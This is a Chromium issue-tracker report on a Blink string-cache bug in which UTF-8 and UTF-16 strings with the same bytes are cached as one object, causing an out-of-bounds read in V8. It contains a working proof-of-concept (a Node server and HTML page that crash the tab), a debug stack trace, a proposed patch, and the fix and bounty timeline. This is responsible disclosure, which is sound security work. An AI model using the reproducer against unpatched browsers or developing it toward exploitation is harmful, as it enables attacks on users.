# Security: String with different encoding mismatch, leading Out-of-bounds access.

| Field | Value |
|-------|-------|
| **Issue ID** | [40063194](https://issues.chromium.org/issues/40063194) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Bindings |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, iOS, ChromeOS |
| **Reporter** | sh...@alibaba-inc.com |
| **Assignee** | li...@chromium.org |
| **Created** | 2023-02-22 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

Blink uses two string mapping caches to save memory. The first string mapping is `WTF::StringImpl -> blink::ParkableStringImpl`, which implements in [1]. The second string mapping is `blink::ParkableStringImpl -> v8::Local<v8::String>`, which implements in [2].

The bug caused by the first string mapping, which uses the SHA256 Hash of string character binary data as the mapping key [3]. If there are two strings with different encoding (one is UTF-16, and the other is UTF-8) has the same character binary datas, it will be regard as the same one, and returns the same `blink::ParkableStringImpl` object after calls `ParkableStringManager::Add`. Then, while passing the `blink::ParkableStringImpl` to V8 [4], `StringCache::V8ExternalString` will use the address of `blink::ParkableStringImpl` object to get the previously cached `v8::Local<v8::String>`, which may has mismatch encoding.

Another background: Blink uses V8 streaming compile while loading JavaScript source [5], which does not go through the string mapping describled above. But after the script loaded, Blink invokes `ScriptCompiler::Compile` to finish the compile [4], which will use the string mapping. Thus leads two version string (UTF-16 & UTF-8) presents in V8.

[1] <https://source.chromium.org/chromium/chromium/src/+/cc292ff31069a325895c14671691b60c80ac8d11:third_party/blink/renderer/platform/bindings/parkable_string_manager.cc;l=147>  

[2] <https://source.chromium.org/chromium/chromium/src/+/cc292ff31069a325895c14671691b60c80ac8d11:third_party/blink/renderer/platform/bindings/v8_value_cache.cc;l=184?q=v8_value_cache.cc&ss=chromium%2Fchromium%2Fsrc>  

[3] <https://source.chromium.org/chromium/chromium/src/+/cc292ff31069a325895c14671691b60c80ac8d11:third_party/blink/renderer/platform/bindings/parkable_string.cc;drc=d8b8e2c3be40b67606cc52d3dfe90615da6a3d89;l=234>  

[4] <https://source.chromium.org/chromium/chromium/src/+/cc292ff31069a325895c14671691b60c80ac8d11:third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc;l=124?q=v8_script_runner.cc&ss=chromium%2Fchromium%2Fsrc>  

[5] <https://source.chromium.org/chromium/chromium/src/+/cc292ff31069a325895c14671691b60c80ac8d11:third_party/blink/renderer/bindings/core/v8/script_streamer.cc;l=744?q=StartStreaming&ss=chromium%2Fchromium%2Fsrc>

**VERSION**  

Chrome Version: 110.0.5481.100 (Official Build) (64-bit), Chromium HEAD (cc292ff31069a325895c14671691b60c80ac8d11) also.  

Operating System: Ubuntu 22.04, Android, should exists in all platform.

**REPRODUCTION CASE**

1. Start the server with `npm install && node server.js`
2. Open `http://localhost:8089` or `http://<your_ip>:8089`
3. Open inspector for the page, and reload the page.
4. The tab will crashes.

Currently it crashes only with inspector opens, but I believe someone can construct another crash site or attack case with the BUG.

```
// nodejs server.js  
const http = require("http");  
const express = require("express");  
const fs = require("fs");  
const path = require("path");  
const app = express();  
const server = http.createServer(app);  
  
const ip_address = require("ip").address();  
const port = 8089;  
  
app.get("\*", (req, res) => {  
  let reqpath = req.path;  
  console.log(reqpath);  
  
  if (reqpath == "/index.html" || reqpath == "/") {  
    res.setHeader("Content-Type", "text/html");  
    fs.createReadStream("index.html").pipe(res);  
  
  } else if (reqpath == "/u16.js" || reqpath == "/u8.js") {  
    let contentType = "application/javascript; charset=utf-8";  
    if (reqpath == "/u16.js") {  
      contentType = "application/javascript; charset=utf-16le";  
    }  
    res.setHeader("Content-Type", contentType);  
    res.setHeader("cache-control", "max-age=1");  
    fs.createReadStream("./jquery1.7.2.min.js").pipe(res);  
  }  
});  
  
server.listen(port, () => {  
  console.log(`Server running at ${ip_address}:${port}`);  
});  

```
```
<!-- index.html -->  
<html>  
<head>  
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">  
<title>Blink String Cache BUG</title>  
</head>  
<body>  
<h1>Blink String Cache BUG</h1>  
<div>Open inspector, refresh the page, and it will crashes.</div>  
<script type="text/javascript" src="u16.js" ></script>  
<script type="text/javascript" src="u8.js" ></script>  
</body>  
</html>  

```

I also built a debug version of chromium, and it crashes with the following stacktrace:

```
# Fatal error in ../../v8/src/parsing/scanner-character-streams.cc, line 867  
#  
# Debug check failed: end_pos <= data->length() (94832 vs. 47422).  
#  
  
0x0000000000023ed7: V8_Fatal(char const\*, int, char const\*, ...) at ./../../v8/src/base/logging.cc:164  
0x00000000000239a3: v8::base::(anonymous namespace)::DefaultDcheckHandler(char const\*, int, char const\*) at ./../../v8/src/base/logging.cc:57  
0x00000000018d1df3: v8::internal::ScannerStream::For(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::String>, int, int) at ./../../v8/src/parsing/scanner-character-streams.cc:867  
0x00000000018b2be3: v8::internal::parsing::ParseFunction(v8::internal::ParseInfo\*, v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::Isolate\*, v8::internal::parsing::ReportStatisticsMode) at ./../../v8/src/parsing/parsing.cc:80  
0x00000000010eb387: v8::internal::Compiler::CollectSourcePositions(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::SharedFunctionInfo>) at ./../../v8/src/codegen/compiler.cc:2409  
0x0000000001837a3b: v8::internal::SharedFunctionInfo::EnsureSourcePositionsAvailable(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::SharedFunctionInfo>) at ./../../v8/src/objects/shared-function-info.cc:778  
0x0000000001551d0b: v8::internal::CallSiteInfo::ComputeSourcePosition(v8::internal::Handle<v8::internal::CallSiteInfo>, int) at ./../../v8/src/objects/call-site-info.cc:582  
0x000000000154eafb: v8::internal::CallSiteInfo::GetSourcePosition(v8::internal::Handle<v8::internal::CallSiteInfo>) at ./../../v8/src/objects/call-site-info.cc:532  
0x000000000154e913: v8::internal::CallSiteInfo::GetLineNumber(v8::internal::Handle<v8::internal::CallSiteInfo>) at ./../../v8/src/objects/call-site-info.cc:80  
0x0000000001553693: v8::internal::(anonymous namespace)::AppendFileLocation(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::CallSiteInfo>, v8::internal::IncrementalStringBuilder\*) at ./../../v8/src/objects/call-site-info.cc:640  
0x0000000001552f9f: v8::internal::(anonymous namespace)::SerializeJSStackFrame(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::CallSiteInfo>, v8::internal::IncrementalStringBuilder\*) at ./../../v8/src/objects/call-site-info.cc:758  
(inlined by) v8::internal::SerializeCallSiteInfo(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::CallSiteInfo>, v8::internal::IncrementalStringBuilder\*) at ./../../v8/src/objects/call-site-info.cc:817  
0x000000000126ea13: v8::internal::ErrorUtils::FormatStackTrace(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::JSObject>, v8::internal::Handle<v8::internal::Object>) at ./../../v8/src/execution/messages.cc:375  
0x000000000127265b: v8::internal::ErrorUtils::GetFormattedStack(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::JSObject>) at ./../../v8/src/execution/messages.cc:1025  
0x0000000000fa6ef7: v8::internal::Accessors::ErrorStackGetter(v8::Local<v8::Name>, v8::PropertyCallbackInfo<v8::Value> const&) at ./../../v8/src/builtins/accessors.cc:845  
0x000000000146b23f: v8::internal::PropertyCallbackArguments::BasicCallNamedGetterCallback(void (\*)(v8::Local<v8::Name>, v8::PropertyCallbackInfo<v8::Value> const&), v8::internal::Handle<v8::internal::Name>, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>) at ./../../v8/src/api/api-arguments-inl.h:201  
0x00000000017ef0f3: v8::internal::PropertyCallbackArguments::CallAccessorGetter(v8::internal::Handle<v8::internal::AccessorInfo>, v8::internal::Handle<v8::internal::Name>) at ./../../v8/src/api/api-arguments-inl.h:315  
0x00000000017ed6af: v8::internal::Object::GetPropertyWithAccessor(v8::internal::LookupIterator\*) at ./../../v8/src/objects/objects.cc:1444  
0x00000000017ec84b: v8::internal::Object::GetProperty(v8::internal::LookupIterator\*, bool) at ./../../v8/src/objects/objects.cc:1187  
0x00000000019e332f: v8::internal::Runtime::GetObjectProperty(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, bool\*) at ./../../v8/src/runtime/runtime-object.cc:42  
0x0000000000ed9e4f: v8::Object::Get(v8::Local<v8::Context>, v8::Local<v8::Value>) at ./../../v8/src/api/api.cc:4725  
0x0000000001ecdd37: v8_inspector::(anonymous namespace)::descriptionForError(v8::Local<v8::Context>, v8::Local<v8::Object>, v8_inspector::(anonymous namespace)::ErrorType) at ./../../v8/src/inspector/value-mirror.cc:269  
0x0000000001ecc59b: v8_inspector::ValueMirror::create(v8::Local<v8::Context>, v8::Local<v8::Value>) at ./../../v8/src/inspector/value-mirror.cc:1710  
0x0000000001e76a83: v8_inspector::InjectedScript::wrapObject(v8::Local<v8::Value>, v8_inspector::String16 const&, v8_inspector::WrapMode, v8::MaybeLocal<v8::Value>, int, std::Cr::unique_ptr<v8_inspector::protocol::Runtime::RemoteObject, std::Cr::default_delete<v8_inspector::protocol::Runtime::RemoteObject> >\*) at ./../../v8/src/inspector/injected-script.cc:597  
(inlined by) v8_inspector::InjectedScript::wrapObject(v8::Local<v8::Value>, v8_inspector::String16 const&, v8_inspector::WrapMode, std::Cr::unique_ptr<v8_inspector::protocol::Runtime::RemoteObject, std::Cr::default_delete<v8_inspector::protocol::Runtime::RemoteObject> >\*) at ./../../v8/src/inspector/injected-script.cc:587  
0x0000000001eb979f: v8_inspector::V8InspectorSessionImpl::wrapObject(v8::Local<v8::Context>, v8::Local<v8::Value>, v8_inspector::String16 const&, bool) at ./../../v8/src/inspector/v8-inspector-session-impl.cc:338  
0x0000000001e87a6f: v8_inspector::V8ConsoleMessage::wrapException(v8_inspector::V8InspectorSessionImpl\*, bool) const at ./../../v8/src/inspector/v8-console-message.cc:415  
0x0000000001e8724f: v8_inspector::V8ConsoleMessage::reportToFrontend(v8_inspector::protocol::Runtime::Frontend\*, v8_inspector::V8InspectorSessionImpl\*, bool) const at ./../../v8/src/inspector/v8-console-message.cc:318  
0x0000000001ec3b5f: v8_inspector::V8RuntimeAgentImpl::reportMessage(v8_inspector::V8ConsoleMessage\*, bool) at ./../../v8/src/inspector/v8-runtime-agent-impl.cc:1006  
(inlined by) v8_inspector::V8RuntimeAgentImpl::enable() at ./../../v8/src/inspector/v8-runtime-agent-impl.cc:926  
0x0000000001e6c60f: v8_inspector::protocol::Runtime::DomainDispatcherImpl::enable(v8_crdtp::Dispatchable const&) at ./gen/v8/src/inspector/protocol/Runtime.cpp:917  
0x0000000001edc497: std::Cr::__function::__policy_func<void ()>::operator()[abi:v160000]() const at ./../../buildtools/third_party/libc++/trunk/include/__functional/function.h:841  
(inlined by) std::Cr::function<void ()>::operator()() const at ./../../buildtools/third_party/libc++/trunk/include/__functional/function.h:1190  
(inlined by) v8_crdtp::UberDispatcher::DispatchResult::Run() at ./../../v8/third_party/inspector_protocol/crdtp/dispatch.cc:509  
0x0000000001eb9ae7: v8_inspector::V8InspectorSessionImpl::dispatchProtocolMessage(v8_inspector::StringView) at ./../../v8/src/inspector/v8-inspector-session-impl.cc:406  
0x0000000001f2ebef: blink::DevToolsSession::DispatchProtocolCommandImpl(int, WTF::String const&, base::span<unsigned char const, 18446744073709551615ul>) at ./../../third_party/blink/renderer/core/inspector/devtools_session.cc:237  
0x0000000001f2e9eb: blink::DevToolsSession::DispatchProtocolCommand(int, WTF::String const&, base::span<unsigned char const, 18446744073709551615ul>) at ./../../third_party/blink/renderer/core/inspector/devtools_session.cc:208  
0x000000000187b2cb: blink::mojom::blink::DevToolsSessionStubDispatch::Accept(blink::mojom::blink::DevToolsSession\*, mojo::Message\*) at ./gen/third_party/blink/public/mojom/devtools/devtools_agent.mojom-blink.cc:1094  

```

The BUG can be fixed with the following patch:

```
diff --git a/third_party/blink/renderer/platform/bindings/parkable_string.cc b/third_party/blink/renderer/platform/bindings/parkable_string.cc  
index f37a278543937..bd7a18ea497a4 100644  
--- a/third_party/blink/renderer/platform/bindings/parkable_string.cc  
+++ b/third_party/blink/renderer/platform/bindings/parkable_string.cc  
@@ -236,7 +236,9 @@ ParkableStringImpl::HashString(StringImpl\* string) {  
   DigestValue digest_result;  
   bool ok = ComputeDigest(kHashAlgorithmSha256,  
                           static_cast<const char\*>(string->Bytes()),  
-                          string->CharactersSizeInBytes(), digest_result);  
+                          string->CharactersSizeInBytes(),  
+                          string->Is8Bit() ? 1 : 0,  
+                          digest_result);  
  
   // The only case where this can return false in BoringSSL is an allocation  
   // failure of the temporary data required for hashing. In this case, there  
diff --git a/third_party/blink/renderer/platform/crypto.cc b/third_party/blink/renderer/platform/crypto.cc  
index e784719590a41..0fc9ff9d699ec 100644  
--- a/third_party/blink/renderer/platform/crypto.cc  
+++ b/third_party/blink/renderer/platform/crypto.cc  
@@ -77,4 +77,13 @@ bool ComputeDigest(HashAlgorithm algorithm,  
   return !digestor.has_failed();  
 }  
  
+bool ComputeDigest(HashAlgorithm algorithm, const char\* digestable,  
+                   size_t length, int flag, DigestValue& digest_result) {  
+  Digestor digestor(algorithm);  
+  digestor.Update(base::as_bytes(base::make_span(digestable, length)));  
+  digestor.Update(base::as_bytes(base::make_span(&flag, 1)));  
+  digestor.Finish(digest_result);  
+  return !digestor.has_failed();  
+}  
+  
 }  // namespace blink  
diff --git a/third_party/blink/renderer/platform/crypto.h b/third_party/blink/renderer/platform/crypto.h  
index cec17a5262d33..21e1c31c6e386 100644  
--- a/third_party/blink/renderer/platform/crypto.h  
+++ b/third_party/blink/renderer/platform/crypto.h  
@@ -31,6 +31,10 @@ PLATFORM_EXPORT bool ComputeDigest(HashAlgorithm,  
                                    size_t length,  
                                    DigestValue& digest_result);  
  
+PLATFORM_EXPORT bool ComputeDigest(HashAlgorithm, const char\* digestable,  
+                                   size_t length, int flag,  
+                                   DigestValue& digest_result);  
+  
 class PLATFORM_EXPORT Digestor {  
  public:  
   explicit Digestor(HashAlgorithm);  

```

**CREDIT INFORMATION**  

Reporter credit: Shijiang Yu

## Attachments

- [server.js](attachments/server.js) (text/plain, 959 B)
- [package.json](attachments/package.json) (text/plain, 444 B)
- [index.html](attachments/index.html) (text/plain, 419 B)
- [jquery1.7.2.min.js](attachments/jquery1.7.2.min.js) (text/plain, 92.6 KB)

## Timeline

### [Deleted User] (2023-02-22)

[Empty comment from Monorail migration]

### sr...@google.com (2023-02-22)

Very interesting bug, thanks for the report!
This looks like an out of bounds read to me, is that correct? I'll mark it as medium severity for now, but please let me know if you disagree.

lizeb@ I saw you were working on this code in the past. Would you be a good owner for this?

[Monorail components: Blink>Bindings]

### [Deleted User] (2023-02-22)

[Empty comment from Monorail migration]

### sh...@alibaba-inc.com (2023-02-22)

Yeah, it is an out of bounds read with the POC in attachments.
But I'm not sure whether it could cause out of bounds write with another exquisitely designed POC, for V8 mixes strings whose length is N and 2*N, and regards them as the same.

### [Deleted User] (2023-02-22)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-02-22)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-03-08)

lizeb: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### li...@chromium.org (2023-03-10)

Looking.

### gi...@appspot.gserviceaccount.com (2023-03-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/ab66c0409aece5bd57511792a3867920f31c589b

commit ab66c0409aece5bd57511792a3867920f31c589b
Author: Benoit Lize <lizeb@chromium.org>
Date: Wed Mar 15 15:04:17 2023

[blink/bindings] Take encoding into account for ParkableString hashing

Hashing is used for string deduplication, must take encoding into
account. See linked bug for details.

Bug: 1418224
Change-Id: I63c024d0a97e44b1f3323cd1ca4d9e953c2beed1
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4328136
Commit-Queue: Benoit Lize <lizeb@chromium.org>
Reviewed-by: Kentaro Hara <haraken@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1117528}

[modify] https://crrev.com/ab66c0409aece5bd57511792a3867920f31c589b/third_party/blink/renderer/platform/bindings/parkable_string.cc
[modify] https://crrev.com/ab66c0409aece5bd57511792a3867920f31c589b/third_party/blink/renderer/core/loader/resource/resource_loader_code_cache_test.cc
[modify] https://crrev.com/ab66c0409aece5bd57511792a3867920f31c589b/third_party/blink/renderer/platform/bindings/parkable_string.h
[modify] https://crrev.com/ab66c0409aece5bd57511792a3867920f31c589b/third_party/blink/renderer/platform/bindings/parkable_string_test.cc


### li...@chromium.org (2023-03-20)

Requesting a merge of #9 to M112.
Rationale: security issue, patch is small, tested in canary.

### [Deleted User] (2023-03-20)

Merge review required: M112 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), obenedict (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### li...@chromium.org (2023-03-20)

1. Security issue, see above.
2. https://chromium-review.googlesource.com/c/chromium/src/+/4328136
3. Yes
4. No
5. N/A
6. No, there is a unit test


### am...@chromium.org (2023-03-20)

Thank you for landing a fix for this issue. Closing as fixed. In the future, for security bugs, please simply close the bug as fixed as soon as the resolving CLs are landed, this will ensure the bug gets tagged for merge review in a timely manner. :) 

M112 merge approved, please merge to branch 5615 at your earliest convenience so this fix can be included in next M112/Beta on Wednesday. 


### go...@chromium.org (2023-03-21)

Please merge your change to M112 by 2:00 PM PT Tuesday, 03/21 so we can take it in for this week's beta release. 

Branch Details: https://chromiumdash.appspot.com/branches

### gi...@appspot.gserviceaccount.com (2023-03-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/6f4549ba5dc610e609e54de72715b3ba49f3990b

commit 6f4549ba5dc610e609e54de72715b3ba49f3990b
Author: Benoit Lize <lizeb@chromium.org>
Date: Tue Mar 21 11:14:20 2023

[blink/bindings] Take encoding into account for ParkableString hashing

Hashing is used for string deduplication, must take encoding into
account. See linked bug for details.

(cherry picked from commit ab66c0409aece5bd57511792a3867920f31c589b)

Bug: 1418224
Change-Id: I63c024d0a97e44b1f3323cd1ca4d9e953c2beed1
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4328136
Commit-Queue: Benoit Lize <lizeb@chromium.org>
Reviewed-by: Kentaro Hara <haraken@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1117528}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4357658
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Owners-Override: Benoit Lize <lizeb@chromium.org>
Auto-Submit: Benoit Lize <lizeb@chromium.org>
Cr-Commit-Position: refs/branch-heads/5615@{#696}
Cr-Branched-From: 9c6408ef696e83a9936b82bbead3d41c93c82ee4-refs/heads/main@{#1109224}

[modify] https://crrev.com/6f4549ba5dc610e609e54de72715b3ba49f3990b/third_party/blink/renderer/platform/bindings/parkable_string.cc
[modify] https://crrev.com/6f4549ba5dc610e609e54de72715b3ba49f3990b/third_party/blink/renderer/core/loader/resource/resource_loader_code_cache_test.cc
[modify] https://crrev.com/6f4549ba5dc610e609e54de72715b3ba49f3990b/third_party/blink/renderer/platform/bindings/parkable_string.h
[modify] https://crrev.com/6f4549ba5dc610e609e54de72715b3ba49f3990b/third_party/blink/renderer/platform/bindings/parkable_string_test.cc


### [Deleted User] (2023-03-21)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-22)

[Empty comment from Monorail migration]

### am...@google.com (2023-03-30)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-03-30)

Congratulations Shijiang Yu! The VRP Panel has decided to award you $5,000 for this report. A member of our finance team will be in touch with you soon to arrange payment. Thank you for your efforts and reporting this issue to us -- nice work! 

### am...@chromium.org (2023-03-31)

[Empty comment from Monorail migration]

### am...@google.com (2023-04-01)

[Empty comment from Monorail migration]

### pg...@google.com (2023-04-04)

[Empty comment from Monorail migration]

### pg...@google.com (2023-04-04)

[Empty comment from Monorail migration]

### [Deleted User] (2023-06-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1418224?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40063194)*
